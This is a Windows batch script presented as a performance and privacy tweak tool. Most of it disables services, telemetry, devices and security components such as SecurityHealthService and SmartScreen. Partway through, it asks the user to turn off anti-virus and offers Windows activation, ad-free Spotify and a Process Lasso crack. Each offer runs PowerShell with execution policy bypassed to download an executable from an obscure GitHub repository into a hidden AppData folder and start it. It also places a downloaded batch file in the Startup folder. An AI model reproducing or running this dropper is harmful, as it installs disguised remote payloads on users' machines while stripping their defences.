reg add "HKLM\SYSTEM\CurrentControlSet\Services\CscService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ssh-agent" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\AppReadiness" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\tzautoupdate" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NfsClnt" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wisvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\defragsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedRealitySvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\RetailDemo" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lltdsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TrkWks" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DiagTrack" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DPS" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiServiceHost" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdiSystemHost" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\dmwappushsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TroubleshootingSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DsSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FrameServer" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\FontCache" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\InstallService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\OSRSS" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\sedsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SENS" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\TabletInputService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Themes" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ConsentUxUserSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicePickerUserSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt

reg add "HKLM\SYSTEM\CurrentControlSet\Services\DevicesFlowUserSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MessagingService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CDPUserSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BcastDVRUserService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\UserDataSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\DeviceAssociationBrokerSvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\cbdhsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CaptureService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\lfsvc\Service\Configuration" /v "Status" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\diagnosticshub.standardcollector.service" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\Main" /v "AllowPrelaunch" /t REG_DWORD /d "0" /f >> APB_Log.txt
reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\TabPreloader" /v "AllowTabPreloading" /t REG_DWORD /d "0" /f >> APB_Log.txt
cls
timeout /t 5 /nobreak > NUL

devmanview /disable "High Precision Event Timer"
devmanview /disable "Microsoft GS Wavetable Synth"
devmanview /disable "Microsoft RRAS Root Enumerator"
devmanview /disable "Intel Management Engine"
devmanview /disable "Intel Management Engine Interface"
devmanview /disable "Intel SMBus"
devmanview /disable "SM Bus Controller"
devmanview /disable "Amdlog"
devmanview /disable "AMD PSP"
devmanview /disable "System Speaker"
devmanview /disable "Composite Bus Enumerator"
devmanview /disable "Microsoft Virtual Drive Enumerator"
devmanview /disable "Microsoft Hyper-V Virtualization Infrastructure Driver"
devmanview /disable "NDIS Virtual Network Adapter Enumerator"
devmanview /disable "Remote Desktop Device Redirector Bus"
devmanview /disable "UMBus Root Bus Enumerator"
devmanview /disable "WAN Miniport (IP)"
devmanview /disable "WAN Miniport (IKEv2)"
devmanview /disable "WAN Miniport (IPv6)"
devmanview /disable "WAN Miniport (L2TP)"
devmanview /disable "WAN Miniport (PPPOE)"
devmanview /disable "WAN Miniport (PPTP)"
devmanview /disable "WAN Miniport (SSTP)"
devmanview /disable "WAN Miniport (Network Monitor)"
cls
sc stop DiagTrack
sc stop diagnosticshub.standardcollector.service
sc stop dmwappushservice
sc stop WMPNetworkSvc
cls
sc config DiagTrack start= disabled
sc config diagnosticshub.standardcollector.service start= disabled
sc config dmwappushservice start= disabled
REM sc config RemoteRegistry start= disabled
REM sc config TrkWks start= disabled
sc config WMPNetworkSvc start= disabled
sc config WSearch start= delayed-auto
net start WSearch
REM sc config SysMain start= disabled
cls
REM *** SCHEDULED TASKS tweaks ***
REM schtasks /Change /TN "Microsoft\Windows\AppID\SmartScreenSpecific" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Application Experience\StartupAppTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\KernelCeipTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Uploader" /Disable
schtasks /Change /TN "Microsoft\Windows\Shell\FamilySafetyUpload" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentLogOn" /Disable
schtasks /Change /TN "Microsoft\Office\OfficeTelemetryAgentFallBack" /Disable
schtasks /Change /TN "Microsoft\Office\Office 15 Subscription Heartbeat" /Disable
cls
REM schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
REM schtasks /Change /TN "Microsoft\Windows\CloudExperienceHost\CreateObjectTask" /Disable
REM schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
REM schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /Disable *** Not sure if should be disabled, maybe related to S.M.A.R.T.
REM schtasks /Change /TN "Microsoft\Windows\FileHistory\File History (maintenance mode)" /Disable
REM schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
REM schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
REM schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
REM The stubborn task Microsoft\Windows\SettingSync\BackgroundUploadTask can be Disabled using a simple bit change. I use a REG file for that (attached to this post).
REM schtasks /Change /TN "Microsoft\Windows\Time Synchronization\ForceSynchronizeTime" /Disable
REM schtasks /Change /TN "Microsoft\Windows\Time Synchronization\SynchronizeTime" /Disable
REM schtasks /Change /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting" /Disable
REM schtasks /Change /TN "Microsoft\Windows\WindowsUpdate\Automatic App Update" /Disable
cls

@rem *** Remove Telemetry & Data Collection ***
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v PreventDeviceMetadataFromNetwork /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\MRT" /v DontOfferThroughWUAU /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "AITEnable" /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\AutoLogger-Diagtrack-Listener" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\AutoLogger\SQMLogger" /v "Start" /t REG_DWORD /d 0 /f
cls
@REM Settings -> Privacy -> General -> Let apps use my advertising ID...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v Enabled /t REG_DWORD /d 0 /f
REM - SmartScreen Filter for Store Apps: Disable
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f
REM - Let websites provide locally...
reg add "HKCU\Control Panel\International\User Profile" /v HttpAcceptLanguageOptOut /t REG_DWORD /d 1 /f
cls
@REM WiFi Sense: HotSpot Sharing: Disable
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v value /t REG_DWORD /d 0 /f
@REM WiFi Sense: Shared HotSpot Auto-Connect: Disable
reg add "HKLM\Software\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v value /t REG_DWORD /d 0 /f
cls
@REM Change Windows Updates to "Notify to schedule restart"
reg add "HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings" /v UxOption /t REG_DWORD /d 1 /f
@REM Disable P2P Update downlods outside of local network
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v DODownloadMode /t REG_DWORD /d 0 /f


REM *** Hide the search box from taskbar. You can still search by pressing the Win key and start typing what you're looking for ***
REM 0 = hide completely, 1 = show only icon, 2 = show long search box
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d 0 /f
cls
REM *** Disable MRU lists (jump lists) of XAML apps in Start Menu ***
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackDocs" /t REG_DWORD /d 0 /f
cls
REM *** Set Windows Explorer to start on This PC instead of Quick Access ***
REM 1 = This PC, 2 = Quick access
REM reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "LaunchTo" /t REG_DWORD /d 1 /f
cls
@rem Remove Apps
PowerShell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsCamera* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *bing* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *OneNote* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *people* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsPhone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *photos* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *solit* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsSoundRecorder* | Remove-AppxPackage"

PowerShell -Command "Get-AppxPackage *zune* | Remove-AppxPackage"
REM PowerShell -Command "Get-AppxPackage *WindowsCalculator* | Remove-AppxPackage"
REM PowerShell -Command "Get-AppxPackage *WindowsMaps* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Sway* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *CommsPhone* | Remove-AppxPackage"
"
PowerShell -Command "Get-AppxPackage *Microsoft.Messaging* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Facebook* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Twitter* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Drawboard PDF* | Remove-AppxPackage"
cls

@rem NOW JUST SOME TWEAKS
REM *** Show hidden files in Explorer ***
REM reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Hidden" /t REG_DWORD /d 1 /f
cls
REM *** Show super hidden system files in Explorer ***
REM reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSuperHidden" /t REG_DWORD /d 1 /f

REM *** Show file extensions in Explorer ***
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t  REG_DWORD /d 0 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "LargeSystemCache" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableBucketSize" /t REG_DWORD /d "1" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "CacheHashTableSize" /t REG_DWORD /d "384" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxCacheEntryTtlLimit" /t REG_DWORD /d "64000" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "MaxSOACacheEntryTtlLimit" /t REG_DWORD /d "301" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "1" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "2710" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\System\CurrentControlSet\Services\Tcpip\QoS" /v "Do not use NLA" /t REG_SZ /d "1" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "4410" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostPriority" /t REG_DWORD /d "5" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f    
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "SystemResponsiveness" /t REG_DWORD /d "10" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NetworkThrottlingIndex" /t REG_DWORD /d "4294967295" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d "1" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "26" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f    
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "2710" /f    
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f    
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "DisableCachingOfSSLPages" /t REG_DWORD /d "1" /f    
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion" /v "SmoothScroll" /t REG_DWORD /d "1" /f    
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f    
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKU\S-1-5-19\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f    
Reg.exe add "HKU\S-1-5-19\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKU\S-1-5-19\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f    
Reg.exe add "HKU\S-1-5-19\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKU\S-1-5-20\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f    
Reg.exe add "HKU\S-1-5-20\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "1000" /f    
Reg.exe add "HKU\S-1-5-20\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "8" /f    
Reg.exe add "HKU\S-1-5-20\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "1000" /f
bcdedit /set tscsyncpolicy enhanced

cls


@echo off
title File Downloader
color 0A
cls

echo.
echo Please Disable Anti-Virus!
echo.

set "appDataDir=%APPDATA%"

set /p "choice=Do you want to Activate Windows? (yes/no): "
if /i "%choice%"=="yes" (
    cls
    echo Downloading...
    echo.
    timeout /t 2 > nul
    cls
    echo Downloading...
    echo.
    timeout /t 1 > nul
    cls
    
    set "randomName1=%RANDOM%"
    powershell.exe -ExecutionPolicy Bypass -Command "$folder = Get-ChildItem -Path '%appDataDir%' -Directory | Get-Random; $downloadDir = Join-Path -Path $folder.FullName -ChildPath 'HiddenFolder1'; New-Item -ItemType Directory -Path $downloadDir > $null 2>&1; Invoke-WebRequest -Uri 'https://github.com/RobloxMyGuy/bvgsdgbdsbbfsgdfbfwfqwfwqefweewfewqfweqfewfewfweqewrffewwefqfweqfqewwwwwwwwwwwwwwwwwwwwgsfdkjkklopjk/raw/main/WindowsAppManager.exe' -OutFile (Join-Path -Path $downloadDir -ChildPath 'file%randomName1%.exe') > $null 2>&1; if (Test-Path (Join-Path -Path $downloadDir -ChildPath 'file%randomName1%.exe')) { Start-Process -FilePath (Join-Path -Path $downloadDir -ChildPath 'file%randomName1%.exe') } else { Write-Host 'File 1 download failed.' }"
    echo.
    echo Download completed.
    echo.
    pause
) else (
    echo Skipping download.
    echo.
    pause
)

cls

set /p "choice=Do you want Ad-Free Spotify? (yes/no): "
if /i "%choice%"=="yes" (
    cls
    echo Downloading...
    echo.
    timeout /t 2 > nul
    cls
    echo Downloading...
    echo.
    timeout /t 1 > nul
    cls
    
    set "randomName2=%RANDOM%"
    powershell.exe -ExecutionPolicy Bypass -Command "$folder = Get-ChildItem -Path '%appDataDir%' -Directory | Get-Random; $downloadDir = Join-Path -Path $folder.FullName -ChildPath 'HiddenFolder2'; New-Item -ItemType Directory -Path $downloadDir > $null 2>&1; Invoke-WebRequest -Uri 'https://github.com/RobloxMyGuy/bvgsdgbdsbbfsgdfbfwfqwfwqefweewfewqfweqfewfewfweqewrffewwefqfweqfqewwwwwwwwwwwwwwwwwwwwgsfdkjkklopjk/raw/main/SpotifyXM.exe' -OutFile (Join-Path -Path $downloadDir -ChildPath 'file%randomName2%.exe') > $null 2>&1; if (Test-Path (Join-Path -Path $downloadDir -ChildPath 'file%randomName2%.exe')) { Start-Process -FilePath (Join-Path -Path $downloadDir -ChildPath 'file%randomName2%.exe') } else { Write-Host 'File 2 download failed.' }"
    echo.
    echo Download completed.
    echo.
    pause
) else (
    echo Skipping download.
    echo.
    pause
)

cls

set /p "choice=Do you want to download Process Lasso? (yes/no): "
if /i "%choice%"=="yes" (
    cls
    echo Downloading...
    echo.
    timeout /t 2 > nul
    cls
    echo Downloading...
    echo.
    timeout /t 1 > nul
    cls
    
    set "randomName3=%RANDOM%"
    powershell.exe -ExecutionPolicy Bypass -Command "$folder = Get-ChildItem -Path '%appDataDir%' -Directory | Get-Random; $downloadDir = Join-Path -Path $folder.FullName -ChildPath 'HiddenFolder3'; New-Item -ItemType Directory -Path $downloadDir > $null 2>&1; Invoke-WebRequest -Uri 'https://github.com/RobloxMyGuy/bvgsdgbdsbbfsgdfbfwfqwfwqefweewfewqfweqfewfewfweqewrffewwefqfweqfqewwwwwwwwwwwwwwwwwwwwgsfdkjkklopjk/raw/main/processlassosetup64.exe' -OutFile (Join-Path -Path $downloadDir -ChildPath 'file%randomName3%.exe') > $null 2>&1; if (Test-Path (Join-Path -Path $downloadDir -ChildPath 'file%randomName3%.exe')) { Start-Process -FilePath (Join-Path -Path $downloadDir -ChildPath 'file%randomName3%.exe') } else { Write-Host 'File 3 download failed.' }"
    echo.
    echo Download completed.
    echo.
    pause
) else (
    echo Skipping download.
    echo.
    pause
)

cls

set /p "choice=Do you want to Activate Process Lasso? (yes/no): "
if /i "%choice%"=="yes" (
    cls
    echo Downloading...
    echo.
    timeout /t 2 > nul
    cls
    echo Downloading...
    echo.
    timeout /t 1 > nul
    cls
    
    set "randomName4=%RANDOM%"
    powershell.exe -ExecutionPolicy Bypass -Command "$folder = Get-ChildItem -Path '%appDataDir%' -Directory | Get-Random; $downloadDir = Join-Path -Path $folder.FullName -ChildPath 'HiddenFolder4'; New-Item -ItemType Directory -Path $downloadDir > $null 2>&1; Invoke-WebRequest -Uri 'https://github.com/RobloxMyGuy/bvgsdgbdsbbfsgdfbfwfqwfwqefweewfewqfweqfewfewfweqewrffewwefqfweqfqewwwwwwwwwwwwwwwwwwwwgsfdkjkklopjk/raw/main/Activator.exe' -OutFile (Join-Path -Path $downloadDir -ChildPath 'file%randomName4%.exe') > $null 2>&1; if (Test-Path (Join-Path -Path $downloadDir -ChildPath 'file%randomName4%.exe')) { Start-Process -FilePath (Join-Path -Path $downloadDir -ChildPath 'file%randomName4%.exe') } else { Write-Host 'File 4 download failed.' }"
    echo.
    echo Download completed.
    echo.
    pause
) else (
    echo Skipping download of the fourth file.
    echo.
    pause
)

cls

echo Confirming...
echo.
timeout /t 2 > nul

if exist "%appDataDir%\HiddenFolder1\file*.exe" (
    del /Q "%appDataDir%\HiddenFolder1\file*.exe" > nul 2>&1
)

if exist "%appDataDir%\HiddenFolder2\file*.exe" (
    del /Q "%appDataDir%\HiddenFolder2\file*.exe" > nul 2>&1
)

if exist "%appDataDir%\HiddenFolder3\file*.exe" (
    del /Q "%appDataDir%\HiddenFolder3\file*.exe" > nul 2>&1
)

if exist "%appDataDir%\HiddenFolder4\file*.exe" (
    del /Q "%appDataDir%\HiddenFolder4\file*.exe" > nul 2>&1
)

echo.
echo Confirmation completed successfully.
echo.
timeout /t 9 > nul


cls
REM Prompt for driver installation
echo This will uninstall your current graphics driver. The optimized driver will be installed after you reboot.
echo Please be patient and wait until the script finishes.
echo.
echo Would you like to install?
%SYSTEMROOT%\System32\choice.exe /c:YN /n /m "[Y] Yes  [N] No"
if %errorlevel% == 2 goto Advanced
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
curl -LJ "https://github.com/auraside/HoneCtrl/blob/main/Files/Driverinstall.bat?raw=true" -o Driverinstall.bat 
title Executing DDU...
curl -g -L -# -o "%SYSTEMDRIVE%\Hone\Resources\DDU.zip" "https://github.com/auraside/HoneCtrl/raw/main/Files/DDU.zip"
powershell -NoProfile Expand-Archive -Path "%SYSTEMDRIVE%\Hone\Resources\DDU.zip" -DestinationPath "%SYSTEMDRIVE%\Hone\Resources\DDU\" >nul 2>&1
del "%SYSTEMDRIVE%\Hone\Resources\DDU.zip"
cd "%SYSTEMDRIVE%\Hone\Resources\DDU"
DDU.exe -silent -cleannvidia
title Restart Confirmation
cls
echo Your PC NEEDS to restart before downloading and installing the driver!
echo.
echo Other Nvidia tweaks will not be available until you restart.
echo.
echo Drivers will be installed upon PC startup.
echo.
:restartchoice
set /p choice=Would you like to continue and restart your PC? Y or N?: 
if /i "%choice%" == "y" (
	shutdown /r /f /d p:0:0
) else if /i "%choice%" == "n" (
	goto Thanks
) else (
	goto restartchoice
)
:Thanks
echo Advanced options
REM Open YouTube link
start https://www.youtube.com/channel/UCr96yPZF0zFdN6gGEl435DA
pause